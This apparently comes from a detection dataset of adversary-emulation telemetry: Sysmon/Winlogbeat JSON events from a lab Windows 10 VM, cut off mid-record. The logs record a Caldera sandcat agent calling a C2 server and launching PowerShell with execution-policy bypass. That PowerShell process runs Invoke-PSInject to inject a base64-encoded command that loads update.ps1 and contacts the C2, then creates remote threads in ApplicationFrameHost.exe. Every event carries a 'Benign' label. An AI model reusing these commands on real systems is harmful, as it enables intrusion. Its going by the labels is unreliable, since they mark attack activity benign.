{"@timestamp":"2022-03-23T11:00:33.293Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process Create:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 11:00:33.293\nProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nProcessId: 2436\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell.exe -ExecutionPolicy Bypass -C \"Import-Module .\\Invoke-PSInject.ps1 -Verbose -Force;Move-Item -Path .\\update.ps1 -Destination $env:APPDATA -Force;$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\\\"Import-Module $env:APPDATA\\update.ps1;update('http://192.168.56.104:8888')\\\"));Inject -PoshCode $pcode;\"\nCurrentDirectory: C:\\Users\\vagrant\\\nUser: WIN10\\vagrant\nLogonGuid: {04787c88-f86a-623a-be16-040000000000}\nLogonId: 0x416BE\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1=36C5D12033B2EAF251BAE61C00690FFB17FDDC87,MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481\nParentProcessGuid: {04787c88-f96f-623a-ea00-000000000c00}\nParentProcessId: 5344\nParentImage: C:\\Users\\Public\\sandcat.go-windows.exe\nParentCommandLine: \"C:\\Users\\Public\\sandcat.go-windows.exe\" -server http://192.168.56.104:8888 -group red -listenP2P -v \nParentUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"1","api":"wineventlog","record_id":8652,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:34.519Z","code":"1"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:33.293Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process accessed:\nRuleName: technique_id=T1036,technique_name=Masquerading\nUtcTime: 2022-03-23 11:00:33.293\nSourceProcessGUID: {04787c88-f96f-623a-ea00-000000000c00}\nSourceProcessId: 5344\nSourceThreadId: 168\nSourceImage: C:\\Users\\Public\\sandcat.go-windows.exe\nTargetProcessGUID: {04787c88-fdd1-623a-7101-000000000c00}\nTargetProcessId: 2436\nTargetImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nGrantedAccess: 0x1FFFFF\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d934|C:\\Windows\\System32\\KERNELBASE.dll+5f32a|C:\\Windows\\System32\\KERNELBASE.dll+5bcc6|C:\\Windows\\System32\\KERNEL32.DLL+1be93|C:\\Users\\Public\\sandcat.go-windows.exe+644be\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5344,"thread":{"id":168},"entity_id":"{04787c88-f96f-623a-ea00-000000000c00}","executable":"C:\\Users\\Public\\sandcat.go-windows.exe","name":"sandcat.go-windows.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"10","api":"wineventlog","record_id":8653,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:34.519Z","code":"10"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:33.324Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Image loaded:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 11:00:33.324\nProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nProcessId: 2436\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nImageLoaded: C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\6b621f0fd6cc913157b16d8a0cfdc3ec\\System.Management.Automation.ni.dll\nFileVersion: 10.0.18362.145\nDescription: System.Management.Automation\nProduct: Microsoft (R) Windows (R) Operating System\nCompany: Microsoft Corporation\nOriginalFileName: System.Management.Automation.dll\nHashes: SHA1=A03FCAE0C1F4BC4A81F0819DBB94289C373B1052,MD5=B18E1C187DAEB6C9B195BDD2EFDC20C7,SHA256=D36AD842C5E44483BDBBDF13D045AD5A64A9DDD5C1BAB89E81B12299D89DFC27,IMPHASH=00000000000000000000000000000000\nSigned: false\nSignature: -\nSignatureStatus: Unavailable\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"7","api":"wineventlog","record_id":8654,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:34.519Z","code":"7"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:33.339Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"File created:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 11:00:33.339\nProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nProcessId: 2436\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetFilename: C:\\Users\\vagrant\\AppData\\Local\\Temp\\__PSScriptPolicyTest_hsbnw13d.e3f.ps1\nCreationUtcTime: 2022-03-23 11:00:33.339\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"11","api":"wineventlog","record_id":8655,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:34.519Z","code":"11"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:33.355Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Registry object added or deleted:\nRuleName: technique_id=T1130,technique_name=Install Root Certificate\nEventType: CreateKey\nUtcTime: 2022-03-23 11:00:33.355\nProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nProcessId: 2436\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetObject: HKU\\S-1-5-21-1265589927-3242731326-451682020-1000\\Software\\Microsoft\\SystemCertificates\\Root\\Certificates\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"12","api":"wineventlog","record_id":8656,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:34.519Z","code":"12"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:33.355Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Registry object added or deleted:\nRuleName: technique_id=T1130,technique_name=Install Root Certificate\nEventType: CreateKey\nUtcTime: 2022-03-23 11:00:33.355\nProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nProcessId: 2436\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\SystemCertificates\\ROOT\\Certificates\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"12","api":"wineventlog","record_id":8657,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:34.519Z","code":"12"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:33.355Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Registry object added or deleted:\nRuleName: technique_id=T1130,technique_name=Install Root Certificate\nEventType: CreateKey\nUtcTime: 2022-03-23 11:00:33.355\nProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nProcessId: 2436\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"12","api":"wineventlog","record_id":8658,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:34.519Z","code":"12"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:33.371Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"File Delete archived:\nRuleName: -\nUtcTime: 2022-03-23 11:00:33.371\nProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nProcessId: 2436\nUser: WIN10\\vagrant\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetFilename: C:\\Users\\vagrant\\AppData\\Local\\Temp\\__PSScriptPolicyTest_hsbnw13d.e3f.ps1\nHashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000\nIsExecutable: false\nArchived: true","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"23","api":"wineventlog","record_id":8659,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":null},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:34.519Z","code":"23"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:36.751Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"CreateRemoteThread detected:\nRuleName: -\nUtcTime: 2022-03-23 11:00:36.751\nSourceProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nSourceProcessId: 2436\nSourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetProcessGuid: {04787c88-f877-623a-7800-000000000c00}\nTargetProcessId: 5836\nTargetImage: C:\\Windows\\System32\\ApplicationFrameHost.exe\nNewThreadId: 332\nStartAddress: 0x000001EF2F130000\nStartModule: -\nStartFunction: -\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"8","api":"wineventlog","record_id":8660,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:38.704Z","code":"8"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:36.844Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"CreateRemoteThread detected:\nRuleName: -\nUtcTime: 2022-03-23 11:00:36.844\nSourceProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nSourceProcessId: 2436\nSourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetProcessGuid: {04787c88-f877-623a-7800-000000000c00}\nTargetProcessId: 5836\nTargetImage: C:\\Windows\\System32\\ApplicationFrameHost.exe\nNewThreadId: 4420\nStartAddress: 0x000001EF2F130000\nStartModule: -\nStartFunction: -\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"8","api":"wineventlog","record_id":8661,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:38.704Z","code":"8"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:36.860Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"CreateRemoteThread detected:\nRuleName: -\nUtcTime: 2022-03-23 11:00:36.860\nSourceProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nSourceProcessId: 2436\nSourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetProcessGuid: {04787c88-f877-623a-7800-000000000c00}\nTargetProcessId: 5836\nTargetImage: C:\\Windows\\System32\\ApplicationFrameHost.exe\nNewThreadId: 3964\nStartAddress: 0x000001EF2F130000\nStartModule: -\nStartFunction: -\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"8","api":"wineventlog","record_id":8662,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:38.704Z","code":"8"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:36.875Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"CreateRemoteThread detected:\nRuleName: -\nUtcTime: 2022-03-23 11:00:36.875\nSourceProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nSourceProcessId: 2436\nSourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetProcessGuid: {04787c88-f877-623a-7800-000000000c00}\nTargetProcessId: 5836\nTargetImage: C:\\Windows\\System32\\ApplicationFrameHost.exe\nNewThreadId: 4264\nStartAddress: 0x000001EF2F130000\nStartModule: -\nStartFunction: -\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"8","api":"wineventlog","record_id":8663,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:38.704Z","code":"8"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:36.875Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"CreateRemoteThread detected:\nRuleName: -\nUtcTime: 2022-03-23 11:00:36.875\nSourceProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nSourceProcessId: 2436\nSourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetProcessGuid: {04787c88-f877-623a-7800-000000000c00}\nTargetProcessId: 5836\nTargetImage: C:\\Windows\\System32\\ApplicationFrameHost.exe\nNewThreadId: 1740\nStartAddress: 0x000001EF2F130000\nStartModule: -\nStartFunction: -\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2436,"thread":null,"entity_id":"{04787c88-fdd1-623a-7101-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"8","api":"wineventlog","record_id":8664,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T11:00:38.704Z","code":"8"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T11:00:36.891Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"CreateRemoteThread detected:\nRuleName: -\nUtcTime: 2022-03-23 11:00:36.891\nSourceProcessGuid: {04787c88-fdd1-623a-7101-000000000c00}\nSourceProcessId: 2436\nSourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetProcessGuid: {04787c88-f877-623a-7800-000000000c00}\nTargetProcessId: 5836\nTargetImage: C:\\Windows\\System32\\ApplicationFrameHost.exe\nNewThreadId: 4144\nStartAddress: 0x000001EF2F130000\nStartModule: -\nStartFunction: -\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 